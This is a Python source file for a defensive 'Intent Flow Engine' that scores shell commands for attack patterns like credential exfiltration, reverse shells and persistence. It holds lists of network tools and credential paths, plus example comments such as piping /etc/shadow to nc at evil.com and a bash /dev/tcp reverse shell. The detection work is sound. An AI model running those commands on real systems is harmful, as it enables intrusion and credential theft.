"""Intent Flow Engine — score stories, not atoms.

Builds an execution DAG from compound commands, assigns semantic
roles to each segment, tracks data flows (variables, FDs, temp files,
pipes), and detects intent patterns like credential_access →
network_egress = exfiltration.
"""

from __future__ import annotations

import os
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


# ── Semantic Roles ───────────────────────────────────────────────────

class IntentRole(Enum):
    CREDENTIAL_ACCESS = "credential_access"
    NETWORK_EGRESS = "network_egress"
    NETWORK_INGRESS = "network_ingress"
    SHELL_SPAWN = "shell_spawn"
    FILE_WRITE = "file_write"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    ENCODING = "encoding"
    EXECUTION = "execution"
    RECONNAISSANCE = "reconnaissance"
    NEUTRAL = "neutral"


# ── Data Structures ──────────────────────────────────────────────────

@dataclass
class FlowNode:
    index: int
    command: str
    role: IntentRole
    taint: str = ""
    fd_opens: dict = field(default_factory=dict)
    fd_reads: list = field(default_factory=list)
    fd_writes: list = field(default_factory=list)


@dataclass
class FlowEdge:
    source: int
    target: int
    flow_type: str       # "variable", "pipe", "fd", "temp_file", "sequential"
    data_taint: str = "" # "credential", "network", "unknown"


@dataclass
class IntentFlowResult:
    score: int = 0
    patterns: list[str] = field(default_factory=list)
    evidence: list[str] = field(default_factory=list)
    nodes: list[FlowNode] = field(default_factory=list)
    edges: list[FlowEdge] = field(default_factory=list)


# ── Intent Patterns ──────────────────────────────────────────────────

_PATTERNS: dict[str, dict[str, Any]] = {
    "credential_exfiltration": {
        "roles": (IntentRole.CREDENTIAL_ACCESS, IntentRole.NETWORK_EGRESS),
        "floor": 15,
        "desc": "Sensitive data read then sent to network",
    },
    "reverse_shell": {
        "roles": (IntentRole.NETWORK_INGRESS, IntentRole.SHELL_SPAWN),
        "floor": 15,
        "desc": "Network input feeds shell execution",
    },
    "reverse_shell_bidirectional": {
        "roles": (IntentRole.NETWORK_INGRESS, IntentRole.EXECUTION, IntentRole.NETWORK_EGRESS),
        "floor": 18,
        "desc": "Network → execute → send results (interactive shell)",
    },
    "reverse_shell_fd": {
        "roles": (IntentRole.NETWORK_INGRESS, IntentRole.NETWORK_EGRESS),
        "floor": 15,
        "desc": "Bidirectional network FD with execution in between",
        "require_fd": True,
    },
    "download_execute": {
        "roles": (IntentRole.NETWORK_INGRESS, IntentRole.EXECUTION),
        "floor": 12,
        "desc": "Remote payload downloaded and executed",
    },
    "staged_exfiltration": {
        "roles": (IntentRole.CREDENTIAL_ACCESS, IntentRole.ENCODING, IntentRole.NETWORK_EGRESS),
        "floor": 18,
        "desc": "Credential read → encode → exfiltrate",
    },
    "write_persist": {
        "roles": (IntentRole.FILE_WRITE, IntentRole.PERSISTENCE),
        "floor": 12,
        "desc": "Write file then persist via cron/systemd/startup",
    },
    "privilege_credential": {
        "roles": (IntentRole.PRIVILEGE_ESCALATION, IntentRole.CREDENTIAL_ACCESS),
        "floor": 15,
        "desc": "Escalate privileges then access credentials",
    },
}


# ── Role Assignment ──────────────────────────────────────────────────

_NETWORK_BINS = frozenset({
    "curl", "wget", "nc", "ncat", "socat", "scp", "rsync",
    "ftp", "sftp", "telnet",
})

_SHELL_BINS = frozenset({
    "bash", "sh", "zsh", "dash", "ksh", "csh", "fish",
    "/bin/sh", "/bin/bash", "/usr/bin/bash",
})

_ENCODE_BINS = frozenset({
    "base64", "basenc", "xxd", "gzip", "bzip2", "xz", "openssl",
})

_PERSIST_BINS = frozenset({
    "crontab", "at", "systemctl",
})

_RECON_BINS = frozenset({
    "nmap", "ping", "dig", "nslookup", "host", "traceroute",
})

_PRIV_BINS = frozenset({
    "sudo", "su", "pkexec", "doas",
})

# Protected path prefixes for credential detection
_CRED_PATHS = (
    "/etc/shadow", "/etc/gshadow", "/etc/ssh/",
    "/.ssh/", "/aws/credentials", "/kube/config",
    "/.gnupg/", "/etc/krb5.keytab",
)


def _extract_binary(command: str) -> str:
    parts = command.strip().split()
    if not parts:
        return ""
    idx = 0
    while idx < len(parts) and parts[idx] in ("sudo", "env", "nohup", "setsid"):
        idx += 1
    if idx >= len(parts):
        return ""
    return os.path.basename(parts[idx]).lower()


def _extract_path(command: str) -> str:
    """Extract the most relevant file path from a command."""
    m = re.search(r'(/\S+)', command)
    return m.group(1) if m else ""


def classify_role(command: str) -> IntentRole:
    """Assign semantic role to a command segment."""
    binary = _extract_binary(command)
    cmd_lower = command.lower()

    # FD / /dev/tcp — always network
    # bash -i >& /dev/tcp/host/port 0>&1 is a full reverse shell — both ingress+egress
    if "/dev/tcp/" in command or "/dev/udp/" in command:
        if "0>&1" in command or "<>" in command:
            return IntentRole.NETWORK_INGRESS  # bidirectional = classify as ingress
        if "<&" in command or "< " in command:
            return IntentRole.NETWORK_INGRESS
        return IntentRole.NETWORK_EGRESS

    # exec with FD to network
    if binary == "exec" and re.search(r'\d+<>', command):
        if "/dev/tcp" in command or "/dev/udp" in command:
            return IntentRole.NETWORK_INGRESS

    # Reading from network FD (<&N) — handled by caller with fd_map
    if re.search(r'<&\d+', command):
        return IntentRole.NETWORK_INGRESS  # tentative, caller overrides if FD not network

    # Writing to network FD (>&N)
    if re.search(r'>&\d+', command) and not command.startswith("exec"):
        return IntentRole.NETWORK_EGRESS  # tentative

    # Explicit binary roles
    if binary in _NETWORK_BINS:
        # nc with stdin redirect or -e = receiving + sending (reverse shell component)
        if binary in ("nc", "ncat", "socat") and ("<" in command or "-e " in command):
            return IntentRole.NETWORK_INGRESS
        if "-d " in command or "--data" in command or "-T " in command or "--upload" in command:
            return IntentRole.NETWORK_EGRESS
        if "-o " in command or "-O" in command:
            return IntentRole.NETWORK_INGRESS
        return IntentRole.NETWORK_EGRESS

    if binary in _SHELL_BINS:
        return IntentRole.SHELL_SPAWN

    if binary in _ENCODE_BINS:
        # If encoding a credential file, role is CREDENTIAL_ACCESS (encoding is secondary)
        path = _extract_path(command)
        if path and any(cp in path for cp in _CRED_PATHS):
            return IntentRole.CREDENTIAL_ACCESS
        return IntentRole.ENCODING

    if binary in _PERSIST_BINS:
        return IntentRole.PERSISTENCE

    if binary in _RECON_BINS:
        return IntentRole.RECONNAISSANCE

    if binary in _PRIV_BINS:
        return IntentRole.PRIVILEGE_ESCALATION

    # Path-dependent: credential access
    path = _extract_path(command)
    if path and any(cp in path for cp in _CRED_PATHS):
        return IntentRole.CREDENTIAL_ACCESS

    # chmod with SUID = privilege escalation
    if binary == "chmod" and re.search(r'[47]\d{2,3}', command):
        return IntentRole.PRIVILEGE_ESCALATION

    # cron pipe = persistence
    if binary == "crontab" or "crontab" in cmd_lower:
        return IntentRole.PERSISTENCE
    if path and "cron" in path:
        return IntentRole.PERSISTENCE

    # echo with content = file_write (especially when piped to something)
    if binary == "echo" and (">" in command or len(command) > 20):
        return IntentRole.FILE_WRITE

    # mkfifo = neutral by itself but tracked for FD flow
    if binary == "mkfifo":
        return IntentRole.NEUTRAL

    # Direct execution of temp/writable files
    if re.match(r'^(/tmp/|/dev/shm/|/var/tmp/|\./)', command):
        return IntentRole.EXECUTION
    if binary.startswith("/tmp/") or binary.startswith("./"):
        return IntentRole.EXECUTION

    # Dynamic execution indicators
    if "$" in command and any(k in cmd_lower for k in ("do ", "eval ", "exec ")):
        return IntentRole.EXECUTION

    # File write
    if ">" in command and not ">>" in command and not ">&" in command:
        return IntentRole.FILE_WRITE
    if ">>" in command:
        return IntentRole.FILE_WRITE

    return IntentRole.NEUTRAL


# ── FD Tracking ──────────────────────────────────────────────────────

_FD_OPEN_RE = re.compile(r'exec\s+(\d+)<>(\S+)')
_FD_OUT_RE = re.compile(r'exec\s+(\d+)>>?(\S+)')
_FD_IN_RE = re.compile(r'exec\s+(\d+)<(\S+)')
_FD_DUP_RE = re.compile(r'(\d+)>&(\d+)')
_FD_READ_RE = re.compile(r'<&(\d+)')
_FD_WRITE_RE = re.compile(r'>&(\d+)')


def _track_fds(segments: list[str]) -> dict[int, str]:
    """Track FD assignments across segments."""
    fd_map: dict[int, str] = {}
    for seg in segments:
        m = _FD_OPEN_RE.search(seg)
        if m:
            fd_map[int(m.group(1))] = m.group(2)
        m = _FD_OUT_RE.search(seg)
        if m:
            fd_map[int(m.group(1))] = m.group(2)
        m = _FD_IN_RE.search(seg)
        if m:
            fd_map[int(m.group(1))] = m.group(2)
        # FD duplication: N>&M → N inherits M's target
        for dm in _FD_DUP_RE.finditer(seg):
            src, tgt = int(dm.group(1)), int(dm.group(2))
            if tgt in fd_map:
                fd_map[src] = fd_map[tgt]
    return fd_map


# ── Subsequence Detection ────────────────────────────────────────────

def _is_subsequence(pattern: tuple, sequence: list) -> bool:
    """Check if pattern is a subsequence of sequence (order preserved, gaps allowed)."""
    it = iter(sequence)
    return all(role in it for role in pattern)


# ── Engine ───────────────────────────────────────────────────────────

class IntentFlowEngine:
    """Analyze command/script intent by building execution graphs."""

    def analyze(self, input_text: str, *, is_script: bool = False) -> IntentFlowResult:
        """Analyze a command or script for intent patterns.

        Args:
            input_text: Command string or multi-line script content
            is_script: True if input is a multi-line script file
        """
        # Step 1: Split into segments
        if is_script:
            raw_segments = [
                l.strip() for l in input_text.split("\n")
                if l.strip() and not l.strip().startswith("#") and not l.strip().startswith("//")
            ]
        else:
            # Split on ; and && (simple split, compound aware)
            raw_segments = re.split(r'\s*&&\s*|\s*;\s*', input_text)
            raw_segments = [s.strip() for s in raw_segments if s.strip()]

        if not raw_segments:
            return IntentFlowResult()

        # Step 1b: Expand pipes into separate segments with roles
        # "cat /etc/shadow | nc evil.com 4444" → two segments
        expanded_segments: list[str] = []
        for seg in raw_segments:
            if "|" in seg and "||" not in seg:
                pipe_parts = [p.strip() for p in seg.split("|") if p.strip()]
                expanded_segments.extend(pipe_parts)
            else:
                expanded_segments.append(seg)
        raw_segments = expanded_segments

        # Step 2: Resolve variables
        variables: dict[str, str] = {}
        resolved: list[str] = []

        for seg in raw_segments:
            # Track VAR=$(cmd) assignments
            var_cmd = re.match(r'^([A-Za-z_]\w*)=\$\((.+)\)$', seg)
            if var_cmd:
                var_name, var_source = var_cmd.group(1), var_cmd.group(2)
                variables[var_name] = var_source
                resolved.append(var_source)
                continue

            # Track VAR=value assignments
            var_val = re.match(r'^([A-Za-z_]\w*)=(.+)$', seg)
            if var_val and not seg.startswith("export "):
                var_name, var_value = var_val.group(1), var_val.group(2)
                variables[var_name] = var_value
                continue

            # Resolve $VAR references
            expanded = seg
            for vn, vv in variables.items():
                expanded = expanded.replace(f"${vn}", vv)
                expanded = expanded.replace(f"${{{vn}}}", vv)

            if len(expanded) >= 2:
                resolved.append(expanded)

        if not resolved:
            return IntentFlowResult()

        # Step 3: Track FD redirects
        fd_map = _track_fds(resolved)
        has_network_fd = any("/dev/tcp" in v or "/dev/udp" in v for v in fd_map.values())

        # Step 4: Build flow graph with role assignment
        nodes: list[FlowNode] = []
        edges: list[FlowEdge] = []

        for i, cmd in enumerate(resolved):
            role = classify_role(cmd)

            # FD-aware role override: if reading/writing a network FD
            for m in _FD_READ_RE.finditer(cmd):
                fd_num = int(m.group(1))
                if fd_num in fd_map and ("/dev/tcp" in fd_map[fd_num] or "/dev/udp" in fd_map[fd_num]):
                    role = IntentRole.NETWORK_INGRESS

            for m in _FD_WRITE_RE.finditer(cmd):
                fd_num = int(m.group(1))
                if fd_num in fd_map and ("/dev/tcp" in fd_map[fd_num] or "/dev/udp" in fd_map[fd_num]):
                    role = IntentRole.NETWORK_EGRESS

            # If role is tentative FD-based but FD isn't network, downgrade
            if role in (IntentRole.NETWORK_INGRESS, IntentRole.NETWORK_EGRESS):
                if re.search(r'[<>]&\d+', cmd) and not has_network_fd:
                    if "/dev/tcp" not in cmd and "/dev/udp" not in cmd:
                        role = IntentRole.NEUTRAL

            node = FlowNode(index=i, command=cmd, role=role)
            nodes.append(node)

            if i > 0:
                # Determine edge taint
                prev_role = nodes[i - 1].role
                taint = "unknown"
                if prev_role == IntentRole.CREDENTIAL_ACCESS:
                    taint = "credential"
                elif prev_role in (IntentRole.NETWORK_INGRESS, IntentRole.NETWORK_EGRESS):
                    taint = "network"

                edges.append(FlowEdge(
                    source=i - 1, target=i,
                    flow_type="fd" if has_network_fd else "sequential",
                    data_taint=taint,
                ))

        # Step 5: Detect intent patterns
        role_sequence = [n.role for n in nodes if n.role != IntentRole.NEUTRAL]
        patterns_found: list[str] = []
        evidence: list[str] = []
        max_floor = 0

        for name, pdef in _PATTERNS.items():
            # Skip FD-required patterns if no FD flow
            if pdef.get("require_fd") and not has_network_fd:
                continue

            if _is_subsequence(pdef["roles"], role_sequence):
                patterns_found.append(name)
                evidence.append(f"Intent: {pdef['desc']}")
                if pdef["floor"] > max_floor:
                    max_floor = pdef["floor"]

        # Special: if we have network FDs + execution anywhere, it's a reverse shell
        if has_network_fd and IntentRole.EXECUTION in role_sequence:
            if "reverse_shell_bidirectional" not in patterns_found:
                patterns_found.append("reverse_shell_bidirectional")
                evidence.append("Intent: Network FD + execution = interactive reverse shell")
                max_floor = max(max_floor, 18)

        # Special: network FD + shell spawn
        if has_network_fd and IntentRole.SHELL_SPAWN in role_sequence:
            if "reverse_shell" not in patterns_found:
                patterns_found.append("reverse_shell")
                evidence.append("Intent: Network FD + shell = reverse shell")
                max_floor = max(max_floor, 15)

        # Special: network FD with bidirectional IO (exec N<>)
        if has_network_fd and any(n.role == IntentRole.NETWORK_INGRESS for n in nodes) \
                and any(n.role == IntentRole.NETWORK_EGRESS for n in nodes):
            if "reverse_shell_fd" not in patterns_found:
                patterns_found.append("reverse_shell_fd")
                evidence.append("Intent: Bidirectional network FD (read + write)")
                max_floor = max(max_floor, 15)

        # Special: single command with /dev/tcp + shell binary = complete reverse shell
        if len(nodes) == 1 and ("/dev/tcp/" in input_text or "/dev/udp/" in input_text):
            binary = _extract_binary(input_text)
            if binary in _SHELL_BINS:
                if "reverse_shell" not in patterns_found:
                    patterns_found.append("reverse_shell")
                    evidence.append("Intent: Shell binary with /dev/tcp = reverse shell")
                    max_floor = max(max_floor, 15)

        # Add role sequence to evidence
        if role_sequence and patterns_found:
            role_str = " → ".join(r.value for r in role_sequence)
            evidence.append(f"Flow: {role_str}")

        return IntentFlowResult(
            score=max_floor,
            patterns=patterns_found,
            evidence=evidence,
            nodes=nodes,
            edges=edges,
        )
